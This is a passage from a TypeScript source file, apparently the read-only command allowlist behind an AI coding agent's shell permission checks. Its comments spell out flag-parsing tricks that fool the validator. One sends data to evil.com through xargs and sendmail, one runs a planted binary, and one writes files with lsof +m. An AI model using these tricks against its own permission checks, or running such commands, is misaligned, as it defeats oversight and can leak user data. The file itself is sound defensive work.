import type { z } from 'zod/v4'
import { getOriginalCwd } from '../../bootstrap/state.js'
import {
  extractOutputRedirections,
  splitCommand_DEPRECATED,
} from '../../utils/bash/commands.js'
import { tryParseShellCommand } from '../../utils/bash/shellQuote.js'
import { getCwd } from '../../utils/cwd.js'
import { isCurrentDirectoryBareGitRepo } from '../../utils/git.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { getPlatform } from '../../utils/platform.js'
import { SandboxManager } from '../../utils/sandbox/sandbox-adapter.js'
import {
  containsVulnerableUncPath,
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  type FlagArgType,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  PYRIGHT_READ_ONLY_COMMANDS,
  RIPGREP_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import type { BashTool } from './BashTool.js'
import { isNormalizedGitCommand } from './commandMatching.js'
import { bashCommandIsSafe_DEPRECATED } from './bashSecurity.js'
import {
  COMMAND_OPERATION_TYPE,
  PATH_EXTRACTORS,
  type PathCommand,
} from './pathValidation.js'
import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'

// 统一的命令校验配置系统。
type CommandConfig = {
  // 从命令（如 `xargs` 或 `git diff`）映射到其安全 flag 及可接受参数类型的 Record。
  safeFlags: Record<string, FlagArgType>
  // 可选正则，用于在 flag 解析之外做额外校验。
  regex?: RegExp
  // 可选回调，用于补充自定义校验逻辑。返回 true 表示命令危险，
  // 返回 false 表示看起来安全。设计上用于与基于 safeFlags 的校验配合使用。
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // 为 false 时，表示该工具不遵循 POSIX 的 `--` 选项结束语义。
  // 此时 validateFlags 会在 `--` 之后继续检查 flag，而不是直接停止。
  // 默认值为 true（大多数工具都遵循 `--`）。
  respectsDoubleDash?: boolean
}

// fd 与 fdfind（Debian/Ubuntu 下的包名）共用的安全 flag 集合。
// 安全性：故意排除了 -x/--exec 和 -X/--exec-batch，
// 因为它们会针对每个搜索结果执行任意命令。
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
  '-h': 'none',
  '--help': 'none',
  '-V': 'none',
  '--version': 'none',
  '-H': 'none',
  '--hidden': 'none',
  '-I': 'none',
  '--no-ignore': 'none',
  '--no-ignore-vcs': 'none',
  '--no-ignore-parent': 'none',
  '-s': 'none',
  '--case-sensitive': 'none',
  '-i': 'none',
  '--ignore-case': 'none',
  '-g': 'none',
  '--glob': 'none',
  '--regex': 'none',
  '-F': 'none',
  '--fixed-strings': 'none',
  '-a': 'none',
  '--absolute-path': 'none',
  // 安全性：故意排除了 -l/--list-details。
  // 它会在内部以子进程方式执行 `ls`（与 --exec-batch 走同一条路径），
  // 如果 PATH 上存在恶意 `ls`，就会带来 PATH 劫持风险。
  '-L': 'none',
  '--follow': 'none',
  '-p': 'none',
  '--full-path': 'none',
  '-0': 'none',
  '--print0': 'none',
  '-d': 'number',
  '--max-depth': 'number',
  '--min-depth': 'number',
  '--exact-depth': 'number',
  '-t': 'string',
  '--type': 'string',
  '-e': 'string',
  '--extension': 'string',
  '-S': 'string',
  '--size': 'string',
  '--changed-within': 'string',
  '--changed-before': 'string',
  '-o': 'string',
  '--owner': 'string',
  '-E': 'string',
  '--exclude': 'string',
  '--ignore-file': 'string',
  '-c': 'string',
  '--color': 'string',
  '-j': 'number',
  '--threads': 'number',
  '--max-buffer-time': 'string',
  '--max-results': 'number',
  '-1': 'none',
  '-q': 'none',
  '--quiet': 'none',
  '--show-errors': 'none',
  '--strip-cwd-prefix': 'none',
  '--one-file-system': 'none',
  '--prune': 'none',
  '--search-path': 'string',
  '--base-directory': 'string',
  '--path-separator': 'string',
  '--batch-size': 'number',
  '--no-require-git': 'none',
  '--hyperlink': 'string',
  '--and': 'string',
  '--format': 'string',
}

// 基于 allowlist 的命令校验中心配置。
// 这里列出的所有命令与 flag 都只能用于读取文件，
// 绝不能允许写文件、执行代码或发起网络请求。
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: {
      '-I': '{}',
      // 安全性：已移除小写 `-i` 与 `-e`。
      // 这两个参数都采用 GNU getopt 的“可选且必须附着”参数语义（`i::`、`e::`）。
      // 参数必须写成附着形式（`-iX`、`-eX`）；若写成空格分隔（`-i X`、`-e X`），
      // 那就表示 flag 本身不带参数，而 `X` 会变成下一个位置参数（也就是目标命令）。
      //
      // `-i`（`i::`，可选 replace-str）:
      //   示例命令：echo /usr/sbin/sendm | xargs -it tail a@evil.com
      //   校验器视角：把 -it 当成 bundle（两者都视为 'none'）→ OK，tail ∈ SAFE_TARGET → break
      //   GNU 真实语义：-i 的 replace-str=t，tail 接收到 /usr/sbin/sendmail → 网络外传
      //
      // `-e`（`e::`，可选 eof-str）:
      //   示例命令：cat data | xargs -e EOF echo foo
      //   校验器视角：-e 会把 'EOF' 吃成参数（类型为 'EOF'），echo ∈ SAFE_TARGET
      //   GNU 真实语义：如果 -e 没有附着参数，就表示没有 eof-str，'EOF' 会被当成目标命令
      //   → 从 PATH 执行名为 EOF 的二进制 → 代码执行（恶意仓库场景）
      //
      // 应改用大写 `-I {}`（强制参数）与 `-E EOF`（POSIX，强制参数）。
      // 这两个写法下，validator 与 xargs 对参数消费方式是一致的。
      // `-i`/`-e` 本身也已被弃用（GNU 的建议分别是“改用 -I”与“改用 -E”）。
      '-n': 'number',
      '-P': 'number',
      '-L': 'number',
      '-s': 'number',
      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
      '-0': 'none',
      '-t': 'none',
      '-r': 'none',
      '-x': 'none',
      '-d': 'char',
    },
  },
  // 来自共享校验映射的全部 git 只读命令。
  ...GIT_READ_ONLY_COMMANDS,
  file: {
    safeFlags: {
      // 输出格式类 flag。
      '--brief': 'none',
      '-b': 'none',
      '--mime': 'none',
      '-i': 'none',
      '--mime-type': 'none',
      '--mime-encoding': 'none',
      '--apple': 'none',
      // 行为控制类 flag。
      '--check-encoding': 'none',
      '-c': 'none',
      '--exclude': 'string',
      '--exclude-quiet': 'string',
      '--print0': 'none',
      '-0': 'none',
      '-f': 'string',
      '-F': 'string',
      '--separator': 'string',
      '--help': 'none',
      '--version': 'none',
      '-v': 'none',
      // 跟随/解引用相关。
      '--no-dereference': 'none',
      '-h': 'none',
      '--dereference': 'none',
      '-L': 'none',
      // magic file 选项（在只读场景下是安全的）。
      '--magic-file': 'string',
      '-m': 'string',
      // 其他安全选项。
      '--keep-going': 'none',
      '-k': 'none',
      '--list': 'none',
      '-l': 'none',
      '--no-buffer': 'none',
      '-n': 'none',
      '--preserve-date': 'none',
      '-p': 'none',
      '--raw': 'none',
      '-r': 'none',
      '-s': 'none',
      '--special-files': 'none',
      // 归档文件解压查看选项。
      '--uncompress': 'none',
      '-z': 'none',
    },
  },
  sed: {
    safeFlags: {
      // 表达式相关 flag。
      '--expression': 'string',
      '-e': 'string',
      // 输出控制。
      '--quiet': 'none',
      '--silent': 'none',
      '-n': 'none',
      // 扩展正则相关。
      '--regexp-extended': 'none',
      '-r': 'none',
      '--posix': 'none',
      '-E': 'none',
      // 行处理相关。
      '--line-length': 'number',
      '-l': 'number',
      '--zero-terminated': 'none',
      '-z': 'none',
      '--separate': 'none',
      '-s': 'none',
      '--unbuffered': 'none',
      '-u': 'none',
      // 调试与帮助。
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    additionalCommandIsDangerousCallback: (
      rawCommand: string,
      _args: string[],
    ) => !sedCommandIsAllowedByAllowlist(rawCommand),
  },
  sort: {
    safeFlags: {
      // 排序选项。
      '--ignore-leading-blanks': 'none',
      '-b': 'none',
      '--dictionary-order': 'none',
      '-d': 'none',
      '--ignore-case': 'none',
      '-f': 'none',
      '--general-numeric-sort': 'none',
      '-g': 'none',
      '--human-numeric-sort': 'none',
      '-h': 'none',
      '--ignore-nonprinting': 'none',
      '-i': 'none',
      '--month-sort': 'none',
      '-M': 'none',
      '--numeric-sort': 'none',
      '-n': 'none',
      '--random-sort': 'none',
      '-R': 'none',
      '--reverse': 'none',
      '-r': 'none',
      '--sort': 'string',
      '--stable': 'none',
      '-s': 'none',
      '--unique': 'none',
      '-u': 'none',
      '--version-sort': 'none',
      '-V': 'none',
      '--zero-terminated': 'none',
      '-z': 'none',
      // 键字段相关配置。
      '--key': 'string',
      '-k': 'string',
      '--field-separator': 'string',
      '-t': 'string',
      // 检查模式。
      '--check': 'none',
      '-c': 'none',
      '--check-char-order': 'none',
      '-C': 'none',
      // 合并模式。
      '--merge': 'none',
      '-m': 'none',
      // 缓冲区大小。
      '--buffer-size': 'string',
      '-S': 'string',
      // 并行处理。
      '--parallel': 'number',
      // 批处理大小。
      '--batch-size': 'number',
      // 帮助与版本信息。
      '--help': 'none',
      '--version': 'none',
    },
  },
  man: {
    safeFlags: {
      // 安全的显示选项。
      '-a': 'none', // 显示所有手册页
      '--all': 'none', // 与 -a 相同
      '-d': 'none', // 调试模式
      '-f': 'none', // 模拟 whatis
      '--whatis': 'none', // 与 -f 相同
      '-h': 'none', // 帮助
      '-k': 'none', // 模拟 apropos
      '--apropos': 'none', // 与 -k 相同
      '-l': 'string', // 本地文件（仅读取，Linux 下安全）
      '-w': 'none', // 显示位置而非内容

      // 安全的格式选项。
      '-S': 'string', // 限定手册章节
      '-s': 'string', // 在 whatis/apropos 模式下与 -S 等价
    },
  },
  // help 命令：只允许 bash 内建 help 的安全 flag，
  // 防止在 help 被 alias 到 man 时遭受攻击（例如 oh-my-zsh 的 common-aliases 插件）。
  // man 的 -P flag 可通过 pager 执行任意命令。
  help: {
    safeFlags: {
      '-d': 'none', // 输出每个主题的简短描述
      '-m': 'none', // 以伪 manpage 格式显示用法
      '-s': 'none', // 仅输出简短的用法摘要
    },
  },
  netstat: {
    safeFlags: {
      // 安全的显示选项。
      '-a': 'none', // 显示所有 socket
      '-L': 'none', // 显示监听队列大小
      '-l': 'none', // 打印完整 IPv6 地址
      '-n': 'none', // 用数字显示网络地址

      // 安全的过滤选项。
      '-f': 'string', // 地址族（inet、inet6、unix、vsock）

      // 安全的接口选项。
      '-g': 'none', // 显示多播组成员信息
      '-i': 'none', // 显示接口状态
      '-I': 'string', // 指定接口

      // 安全的统计选项。
      '-s': 'none', // 显示各协议统计信息

      // 安全的路由选项。
      '-r': 'none', // 显示路由表

      // 安全的 mbuf 选项。
      '-m': 'none', // 显示内存管理统计

      // 其他安全选项。
      '-v': 'none', // 提高输出详细程度
    },
  },
  ps: {
    safeFlags: {
      // UNIX 风格的进程选择选项（这些是安全的）。
      '-e': 'none', // 选择所有进程
      '-A': 'none', // 选择所有进程（与 -e 相同）
      '-a': 'none', // 选择所有带 tty 的进程，但排除 session leader
      '-d': 'none', // 选择所有进程，但排除 session leader
      '-N': 'none', // 取反选择
      '--deselect': 'none',

      // UNIX 风格的输出格式（安全，不显示 env）。
      '-f': 'none', // 完整格式
      '-F': 'none', // 更完整格式
      '-l': 'none', // 长格式
      '-j': 'none', // jobs 格式
      '-y': 'none', // 不显示 flags

      // 输出修饰选项（安全项）。
      '-w': 'none', // 宽输出
      '-ww': 'none', // 无限宽度
      '--width': 'number',
      '-c': 'none', // 显示调度器信息
      '-H': 'none', // 显示进程层级
      '--forest': 'none',
      '--headers': 'none',
      '--no-headers': 'none',
      '-n': 'string', // 设置 namelist 文件
      '--sort': 'string',

      // 线程显示。
      '-L': 'none', // 显示线程
      '-T': 'none', // 显示线程
      '-m': 'none', // 在线程前显示进程

      // 按条件筛选进程。
      '-C': 'string', // 按命令名筛选
      '-G': 'string', // 按真实组 ID 筛选
      '-g': 'string', // 按 session 或有效组筛选
      '-p': 'string', // 按 PID 筛选
      '--pid': 'string',
      '-q': 'string', // 通过 PID 进入 quick 模式
      '--quick-pid': 'string',
      '-s': 'string', // 按 session ID 筛选
      '--sid': 'string',
      '-t': 'string', // 按 tty 筛选
      '--tty': 'string',
      '-U': 'string', // 按真实用户 ID 筛选
      '-u': 'string', // 按有效用户 ID 筛选
      '--user': 'string',

      // 帮助与版本。
      '--help': 'none',
      '--info': 'none',
      '-V': 'none',
      '--version': 'none',
    },
    // 拦截会显示环境变量的 BSD 风格 `e` 修饰符。
    // BSD 选项是“不带前导短横线的纯字母 token”。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 检查纯字母 token 中是否包含 BSD 风格的 `e`
      // （而不是 UNIX 风格的 `-e`）。
      return args.some(
        a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a),
      )
    },
  },
  base64: {
    respectsDoubleDash: false, // macOS base64 does not respect POSIX --
    safeFlags: {
      // 安全的解码选项。
      '-d': 'none', // 解码
      '-D': 'none', // 解码（macOS）
      '--decode': 'none', // 解码

      // 安全的格式选项。
      '-b': 'number', // 按 num 断行（macOS）
      '--break': 'number', // 按 num 断行（macOS）
      '-w': 'number', // 按 COLS 换行（Linux）
      '--wrap': 'number', // 按 COLS 换行（Linux）

      // 安全的输入选项（只读文件，不写文件）。
      '-i': 'string', // 输入文件（读取安全）
      '--input': 'string', // 输入文件（读取安全）

      // 其他安全选项。
      '--ignore-garbage': 'none', // 解码时忽略非字母字符（Linux）
      '-h': 'none', // 帮助
      '--help': 'none', // 帮助
      '--version': 'none', // 版本
    },
  },
  grep: {
    safeFlags: {
      // pattern 相关 flag。
      '-e': 'string', // pattern
      '--regexp': 'string',
      '-f': 'string', // 包含 pattern 的文件
      '--file': 'string',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-G': 'none', // 基础正则（默认）
      '--basic-regexp': 'none',
      '-E': 'none', // 扩展正则
      '--extended-regexp': 'none',
      '-P': 'none', // Perl 正则
      '--perl-regexp': 'none',

      // 匹配控制。
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '--no-ignore-case': 'none',
      '-v': 'none', // 反向匹配
      '--invert-match': 'none',
      '-w': 'none', // 单词级正则
      '--word-regexp': 'none',
      '-x': 'none', // 整行正则
      '--line-regexp': 'none',

      // 输出控制。
      '-c': 'none', // 计数
      '--count': 'none',
      '--color': 'string',
      '--colour': 'string',
      '-L': 'none', // 不含匹配项的文件
      '--files-without-match': 'none',
      '-l': 'none', // 含匹配项的文件
      '--files-with-matches': 'none',
      '-m': 'number', // 最大匹配数
      '--max-count': 'number',
      '-o': 'none', // 仅输出匹配片段
      '--only-matching': 'none',
      '-q': 'none', // 静默
      '--quiet': 'none',
      '--silent': 'none',
      '-s': 'none', // 不输出消息
      '--no-messages': 'none',

      // 输出行前缀。
      '-b': 'none', // 字节偏移
      '--byte-offset': 'none',
      '-H': 'none', // 带文件名
      '--with-filename': 'none',
      '-h': 'none', // 不带文件名
      '--no-filename': 'none',
      '--label': 'string',
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-T': 'none', // 初始制表符
      '--initial-tab': 'none',
      '-u': 'none', // Unix 字节偏移
      '--unix-byte-offsets': 'none',
      '-Z': 'none', // 文件名后输出 Null
      '--null': 'none',
      '-z': 'none', // Null 分隔数据
      '--null-data': 'none',

      // 上下文控制。
      '-A': 'number', // 后文行数
      '--after-context': 'number',
      '-B': 'number', // 前文行数
      '--before-context': 'number',
      '-C': 'number', // 上下文行数
      '--context': 'number',
      '--group-separator': 'string',
      '--no-group-separator': 'none',

      // 文件与目录选择。
      '-a': 'none', // 按文本处理二进制文件
      '--text': 'none',
      '--binary-files': 'string',
      '-D': 'string', // 设备处理方式
      '--devices': 'string',
      '-d': 'string', // 目录处理方式
      '--directories': 'string',
      '--exclude': 'string',
      '--exclude-from': 'string',
      '--exclude-dir': 'string',
      '--include': 'string',
      '-r': 'none', // 递归
      '--recursive': 'none',
      '-R': 'none', // 递归并解引用
      '--dereference-recursive': 'none',

      // 其他选项。
      '--line-buffered': 'none',
      '-U': 'none', // 按二进制处理
      '--binary': 'none',

      // 帮助与版本。
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },
  ...RIPGREP_READ_ONLY_COMMANDS,
  // 校验和命令：它们只会读取文件并计算/校验哈希值。
  // 这里的所有 flag 都是安全的，因为它们只影响输出格式或校验行为。
  sha256sum: {
    safeFlags: {
      // 模式类 flag。
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 校验/验证类 flag。
      '-c': 'none', // 从文件校验校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 校验时忽略缺失文件
      '--quiet': 'none', // 校验时静默
      '--status': 'none', // 不输出内容，仅用退出码表示成功与否
      '--strict': 'none', // 遇到格式错误行时返回非零
      '-w': 'none', // 对格式错误行给出警告
      '--warn': 'none',

      // 输出格式类 flag。
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 用 NUL 结尾输出行
      '--zero': 'none',

      // 帮助与版本。
      '--help': 'none',
      '--version': 'none',
    },
  },
  sha1sum: {
    safeFlags: {
      // 模式类 flag。
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 校验/验证类 flag。
      '-c': 'none', // 从文件校验校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 校验时忽略缺失文件
      '--quiet': 'none', // 校验时静默
      '--status': 'none', // 不输出内容，仅用退出码表示成功与否
      '--strict': 'none', // 遇到格式错误行时返回非零
      '-w': 'none', // 对格式错误行给出警告
      '--warn': 'none',

      // 输出格式类 flag。
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 用 NUL 结尾输出行
      '--zero': 'none',

      // 帮助与版本。
      '--help': 'none',
      '--version': 'none',
    },
  },
  md5sum: {
    safeFlags: {
      // 模式类 flag。
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 校验/验证类 flag。
      '-c': 'none', // 从文件校验校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 校验时忽略缺失文件
      '--quiet': 'none', // 校验时静默
      '--status': 'none', // 不输出内容，仅用退出码表示成功与否
      '--strict': 'none', // 遇到格式错误行时返回非零
      '-w': 'none', // 对格式错误行给出警告
      '--warn': 'none',

      // 输出格式类 flag。
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 用 NUL 结尾输出行
      '--zero': 'none',

      // 帮助与版本。
      '--help': 'none',
      '--version': 'none',
    },
  },
  // tree 命令：从 READONLY_COMMAND_REGEXES 迁移过来，以支持 flag 与路径参数校验。
  // -o/--output 会写文件，因此被排除；其余 flag 都只是显示/过滤选项。
  tree: {
    safeFlags: {
      // 列表展示选项。
      '-a': 'none', // 所有文件
      '-d': 'none', // 仅目录
      '-l': 'none', // 跟随符号链接
      '-f': 'none', // 完整路径前缀
      '-x': 'none', // 限定在当前文件系统
      '-L': 'number', // 最大深度
      // 安全性：已移除 -R。tree -R 与 -H（HTML 模式）以及 -L（深度）组合时，
      // 会在深度边界处向每个子目录写入 00Tree.html 文件。
      // man tree（< 2.1.0）里写得很清楚：
      // “-R —— 在每个目录再次执行 tree，并额外追加 `-o 00Tree.html` 选项。”
      // 过去那句“在最大深度重新运行”会误导人，因为所谓 rerun 实际自带硬编码的 -o 写文件行为。
      // `tree -R -H . -L 2 /path` 会对深度 2 的每个子目录写入 /path/<subdir>/00Tree.html。
      // 这是文件写入，零权限。
      '-P': 'string', // 包含模式
      '-I': 'string', // 排除模式
      '--gitignore': 'none',
      '--gitfile': 'string',
      '--ignore-case': 'none',
      '--matchdirs': 'none',
      '--metafirst': 'none',
      '--prune': 'none',
      '--info': 'none',
      '--infofile': 'string',
      '--noreport': 'none',
      '--charset': 'string',
      '--filelimit': 'number',
      // 文件显示选项。
      '-q': 'none', // 不可打印字符显示为 ?
      '-N': 'none', // 不可打印字符按原样显示
      '-Q': 'none', // 给文件名加引号
      '-p': 'none', // 显示权限
      '-u': 'none', // 显示所有者
      '-g': 'none', // 显示所属组
      '-s': 'none', // 显示字节大小
      '-h': 'none', // 人类可读大小
      '--si': 'none',
      '--du': 'none',
      '-D': 'none', // 最后修改时间
      '--timefmt': 'string',
      '-F': 'none', // 追加类型标记
      '--inodes': 'none',
      '--device': 'none',
      // 排序选项。
      '-v': 'none', // 版本排序
      '-t': 'none', // 按 mtime 排序
      '-c': 'none', // 按 ctime 排序
      '-U': 'none', // 不排序
      '-r': 'none', // 逆序排序
      '--dirsfirst': 'none',
      '--filesfirst': 'none',
      '--sort': 'string',
      // 图形/输出选项。
      '-i': 'none', // 不显示缩进线
      '-A': 'none', // ANSI 线框图形
      '-S': 'none', // CP437 线框图形
      '-n': 'none', // 无颜色
      '-C': 'none', // 彩色输出
      '-X': 'none', // XML 输出
      '-J': 'none', // JSON 输出
      '-H': 'string', // 带 base HREF 的 HTML 输出
      '--nolinks': 'none',
      '--hintro': 'string',
      '--houtro': 'string',
      '-T': 'string', // HTML 标题
      '--hyperlink': 'none',
      '--scheme': 'string',
      '--authority': 'string',
      // 输入选项（从文件读，不会写文件）。
      '--fromfile': 'none',
      '--fromtabfile': 'none',
      '--fflinks': 'none',
      // 帮助与版本。
      '--help': 'none',
      '--version': 'none',
    },
  },
  // date 命令：从 READONLY_COMMANDS 移出，因为 -s/--set 会设置系统时间。
  // 同时 -f/--file 也可通过读取文件批量设置时间。
  // 因此这里只允许安全的显示选项。
  date: {
    safeFlags: {
      // 显示选项（安全，不会修改系统时间）。
      '-d': 'string', // --date=STRING - 显示 STRING 描述的时间
      '--date': 'string',
      '-r': 'string', // --reference=FILE - 显示文件修改时间
      '--reference': 'string',
      '-u': 'none', // --utc - 使用 UTC
      '--utc': 'none',
      '--universal': 'none',
      // 输出格式选项。
      '-I': 'none', // --iso-8601（可以带可选参数，但 none 类型用于处理裸 flag）
      '--iso-8601': 'string',
      '-R': 'none', // --rfc-email
      '--rfc-email': 'none',
      '--rfc-3339': 'string',
      // 调试与帮助。
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    // 危险 flag 不会出现在这里（通过省略方式阻断）：
    // -s / --set - 设置系统时间
    // -f / --file - 从文件读取日期（可被用来批量设置时间）
    // 关键点：date 的位置参数如果符合 MMDDhhmm[[CC]YY][.ss] 格式，就会直接设置系统时间。
    // 因此这里用回调强制要求所有位置参数都必须以 + 开头
    // （也就是像 +"%Y-%m-%d" 这种格式字符串）。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // args 已经是 "date" 之后解析出的 token。
      // 这些 flag 需要跟参数。
      const flagsWithArgs = new Set([
        '-d',
        '--date',
        '-r',
        '--reference',
        '--iso-8601',
        '--rfc-3339',
      ])
      let i = 0
      while (i < args.length) {
        const token = args[i]!
        // 跳过 flag 及其参数。
        if (token.startsWith('--') && token.includes('=')) {
          // 长 flag 使用 =value 形式时，参数已在当前 token 中消费完毕。
          i++
        } else if (token.startsWith('-')) {
          // flag：检查它是否需要参数。
          if (flagsWithArgs.has(token)) {
            i += 2 // 跳过 flag 及其参数
          } else {
            i++ // 只跳过这个 flag
          }
        } else {
          // 位置参数必须以 + 开头，表示格式字符串。
          // 其他内容（例如 MMDDhhmm）都可能设置系统时间。
          if (!token.startsWith('+')) {
            return true // 危险
          }
          i++
        }
      }
      return false // 安全
    },
  },
  // hostname 命令：从 READONLY_COMMANDS 移出，因为位置参数会直接设置 hostname。
  // 同时 -F/--file 会从文件设置 hostname，-b/--boot 会设置默认 hostname。
  // 因此这里只允许安全的显示选项，并阻断所有位置参数。
  hostname: {
    safeFlags: {
      // 仅显示类选项（安全）。
      '-f': 'none', // --fqdn - 显示 FQDN
      '--fqdn': 'none',
      '--long': 'none',
      '-s': 'none', // --short - 显示短名称
      '--short': 'none',
      '-i': 'none', // --ip-address
      '--ip-address': 'none',
      '-I': 'none', // --all-ip-addresses
      '--all-ip-addresses': 'none',
      '-a': 'none', // --alias
      '--alias': 'none',
      '-d': 'none', // --domain
      '--domain': 'none',
      '-A': 'none', // --all-fqdns
      '--all-fqdns': 'none',
      '-v': 'none', // --verbose
      '--verbose': 'none',
      '-h': 'none', // --help
      '--help': 'none',
      '-V': 'none', // --version
      '--version': 'none',
    },
    // 关键点：任何位置参数都必须阻断，因为它们会设置 hostname。
    // 同时 -F/--file、-b/--boot、-y/--yp/--nis 也会被一并阻断
    // （因为它们没有进入 safeFlags）。
    // 这里用 regex 确保在 flag 之后不会再出现位置参数。
    regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
  },
  // info 命令：从 READONLY_COMMANDS 移出，因为 -o/--output 会写文件。
  // 另外 --dribble 会把按键记录写入文件，--init-file 会加载自定义配置。
  // 因此这里只允许安全的显示/导航选项。
  info: {
    safeFlags: {
      // 导航/显示选项（安全）。
      '-f': 'string', // --file - 指定要读取的手册文件
      '--file': 'string',
      '-d': 'string', // --directory - 搜索路径
      '--directory': 'string',
      '-n': 'string', // --node - 指定节点
      '--node': 'string',
      '-a': 'none', // --all
      '--all': 'none',
      '-k': 'string', // --apropos - 搜索
      '--apropos': 'string',
      '-w': 'none', // --where - 显示位置
      '--where': 'none',
      '--location': 'none',
      '--show-options': 'none',
      '--vi-keys': 'none',
      '--subnodes': 'none',
      '-h': 'none',
      '--help': 'none',
      '--usage': 'none',
      '--version': 'none',
    },
    // 危险 flag 不会出现在这里（通过省略方式阻断）：
    // -o / --output - 把输出写入文件
    // --dribble - 把按键记录写入文件
    // --init-file - 加载自定义配置（可能导致代码执行）
    // --restore - 从文件回放按键记录
  },

  lsof: {
    safeFlags: {
      '-?': 'none',
      '-h': 'none',
      '-v': 'none',
      '-a': 'none',
      '-b': 'none',
      '-C': 'none',
      '-l': 'none',
      '-n': 'none',
      '-N': 'none',
      '-O': 'none',
      '-P': 'none',
      '-Q': 'none',
      '-R': 'none',
      '-t': 'none',
      '-U': 'none',
      '-V': 'none',
      '-X': 'none',
      '-H': 'none',
      '-E': 'none',
      '-F': 'none',
      '-g': 'none',
      '-i': 'none',
      '-K': 'none',
      '-L': 'none',
      '-o': 'none',
      '-r': 'none',
      '-s': 'none',
      '-S': 'none',
      '-T': 'none',
      '-x': 'none',
      '-A': 'string',
      '-c': 'string',
      '-d': 'string',
      '-e': 'string',
      '-k': 'string',
      '-p': 'string',
      '-u': 'string',
      // 已省略（会写磁盘）：-D（构建/更新 device cache 文件）
    },
    // 阻断 +m（创建 mount supplement file），因为它会写磁盘。
    // validateFlags 会把 + 前缀 flag 当成位置参数，
    // 因此必须在这里额外拦截。lsof 接受 +m<path> 这种无空格附着形式，
    // 既可能是绝对路径（+m/tmp/evil），也可能是相对路径（+mfoo、+m.evil）。
    additionalCommandIsDangerousCallback: (_rawCommand, args) =>
      args.some(a => a === '+m' || a.startsWith('+m')),
  },

  pgrep: {
    safeFlags: {
      '-d': 'string',
      '--delimiter': 'string',
      '-l': 'none',
      '--list-name': 'none',
      '-a': 'none',
      '--list-full': 'none',
      '-v': 'none',
      '--inverse': 'none',
      '-w': 'none',
      '--lightweight': 'none',
      '-c': 'none',
      '--count': 'none',
      '-f': 'none',
      '--full': 'none',
      '-g': 'string',
      '--pgroup': 'string',
      '-G': 'string',
      '--group': 'string',
      '-i': 'none',
      '--ignore-case': 'none',
      '-n': 'none',
      '--newest': 'none',
      '-o': 'none',
      '--oldest': 'none',
      '-O': 'string',
      '--older': 'string',
      '-P': 'string',
      '--parent': 'string',
      '-s': 'string',
      '--session': 'string',
      '-t': 'string',
      '--terminal': 'string',
      '-u': 'string',
      '--euid': 'string',
      '-U': 'string',
      '--uid': 'string',
      '-x': 'none',
      '--exact': 'none',
      '-F': 'string',
      '--pidfile': 'string',
      '-L': 'none',
      '--logpidfile': 'none',
      '-r': 'string',
      '--runstates': 'string',
      '--ns': 'string',
      '--nslist': 'string',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },

  tput: {
    safeFlags: {
      '-T': 'string',
      '-V': 'none',
      '-x': 'none',
      // 安全性：故意排除了 -S（从 stdin 读取 capability 名称）。
      // 它绝不能进入 safeFlags，因为 validateFlags 会拆开组合短 flag
      // （例如 -xS → -x + -S），但回调拿到的仍是原始 token '-xS'，
      // 只能做 `token === "-S"` 这种精确判断。
      // 把 -S 排除在 safeFlags 之外，才能确保 validateFlags 在回调运行前
      // 就先把它拦掉，无论它是否与别的短 flag 组合。
      // 回调中的 -S 检查只是 defense-in-depth。
    },
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 这些 capability 会修改终端状态，或者本身就具有危险性。
      // init/reset 会运行 iprog（来自 terminfo 的任意代码），并修改 tty 设置。
      // rs1/rs2/rs3/is1/is2/is3 是 init/reset 内部调用的各阶段序列，
      // 其中 rs1 会发送 ESC c（完整终端重置）。
      // clear 会擦除 scrollback（可能破坏证据）。mc5/mc5p 会激活媒体复制
      // （把输出重定向到打印设备）。smcup/rmcup 会操作屏幕缓冲区。
      // pfkey/pfloc/pfx/pfxl 会编程功能键，其中 pfloc 会在本地执行字符串。
      // rf 是 reset file，对应于 if/init_file 一类机制。
      const DANGEROUS_CAPABILITIES = new Set([
        'init',
        'reset',
        'rs1',
        'rs2',
        'rs3',
        'is1',
        'is2',
        'is3',
        'iprog',
        'if',
        'rf',
        'clear',
        'flash',
        'mc0',
        'mc4',
        'mc5',
        'mc5i',
        'mc5p',
        'pfkey',
        'pfloc',
        'pfx',
        'pfxl',
        'smcup',
        'rmcup',
      ])
      const flagsWithArgs = new Set(['-T'])
      let i = 0
      let afterDoubleDash = false
      while (i < args.length) {
        const token = args[i]!
        if (token === '--') {
          afterDoubleDash = true
          i++
        } else if (!afterDoubleDash && token.startsWith('-')) {
